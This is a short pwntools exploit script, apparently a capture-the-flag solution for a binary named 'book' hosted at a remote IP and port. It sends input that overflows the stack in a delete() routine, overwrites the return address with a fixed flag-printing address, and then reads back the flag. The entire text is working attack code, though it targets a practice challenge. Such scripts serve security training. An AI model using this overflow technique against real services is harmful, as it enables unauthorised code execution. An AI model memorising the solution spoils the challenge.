from pwn import *
DEBUG=1
list = [ ]
if DEBUG:
    env = os.environ
    #nv["LD_PRELOAD"] = os.getcwd() + '/libc-2.23.so'
    #context.log_level = 'debug'
    p = process("./book")

else:
    context.log_level = 'info'
    p = remote("117.34.105.33",6002)

#libc = ELF('./libc-2.23.so')
#elf = ELF("./book")

def exp():
    p.recvuntil("Who")
    p.sendline("shell01")
    p.recvuntil("delete")
    p.sendline("delete")
    p.recvuntil("----\n")
    #delete() stack overflow
    flag_addr = 0x8048870
    payload = 'a' * 0x1A + p32(flag_addr)
    p.sendline(payload)
    p.recvuntil("----\n")
    p.recvuntil("----\n")
    flag = p.recvuntil("}")
    print flag

if __name__ == "__main__":
    exp()
